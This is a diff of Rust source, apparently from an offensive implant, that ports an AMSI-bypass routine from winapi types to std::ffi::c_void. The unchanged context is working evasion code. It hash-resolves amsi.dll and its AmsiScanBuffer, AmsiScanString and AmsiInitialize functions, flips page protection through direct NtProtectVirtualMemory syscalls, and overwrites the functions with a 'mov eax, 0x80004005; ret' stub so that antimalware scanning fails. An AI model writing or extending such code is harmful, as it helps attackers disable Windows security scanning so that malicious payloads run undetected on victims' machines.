@@ -266,7 +266,7 @@ fn apply_memory_patch() {
     /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
     /// Returns `true` on success (NTSTATUS >= 0).
     #[inline(always)]
-    unsafe fn nt_protect(base: *mut winapi::ctypes::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
+    unsafe fn nt_protect(base: *mut std::ffi::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
         let mut prot_base = base;
         let mut prot_size = size;
         let status = syscall!(
@@ -286,19 +286,19 @@ fn apply_memory_patch() {
         // nothing to patch.
         let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
         let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
-            Some(b) => b as winapi::shared::minwindef::HMODULE,
+            Some(b) => b as *mut std::ffi::c_void,
             None => {
                 log::debug!("apply_memory_patch: amsi.dll not loaded — nothing to patch");
                 return;
             }
         };
-        let hmod = hmod_base as *mut winapi::ctypes::c_void;
+        let hmod = hmod_base as *mut std::ffi::c_void;
 
         // Resolve AmsiScanBuffer via hash
         let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
         let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_buf_hash)
         {
-            Some(addr) => addr as *mut winapi::ctypes::c_void,
+            Some(addr) => addr as *mut std::ffi::c_void,
             None => {
                 log::warn!("apply_memory_patch: AmsiScanBuffer not found");
                 return;
@@ -324,7 +324,7 @@ fn apply_memory_patch() {
         if let Some(scan_str_addr) =
             pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_str_hash)
         {
-            let scan_str = scan_str_addr as *mut winapi::ctypes::c_void;
+            let scan_str = scan_str_addr as *mut std::ffi::c_void;
             let mut op: u32 = 0;
             // P2-05: RW → write → restore (never RWX)
             if nt_protect(scan_str, patch.len(), PAGE_READWRITE, &mut op) {
@@ -416,7 +416,7 @@ fn set_init_failed_flag() {
     /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
     /// Returns `true` on success (NTSTATUS >= 0).
     #[inline(always)]
-    unsafe fn nt_protect(base: *mut winapi::ctypes::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
+    unsafe fn nt_protect(base: *mut std::ffi::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
         let mut prot_base = base;
         let mut prot_size = size;
         let status = syscall!(
@@ -442,7 +442,7 @@ fn set_init_failed_flag() {
         // mov eax, 0x80004005 ; ret  => B8 05 40 00 80 C3
         let init_hash = pe_resolve::hash_str(b"AmsiInitialize\0");
         let init_fn = match pe_resolve::get_proc_address_by_hash(hmod_base, init_hash) {
-            Some(addr) => addr as *mut winapi::ctypes::c_void,
+            Some(addr) => addr as *mut std::ffi::c_void,
             None => return,
         };
 
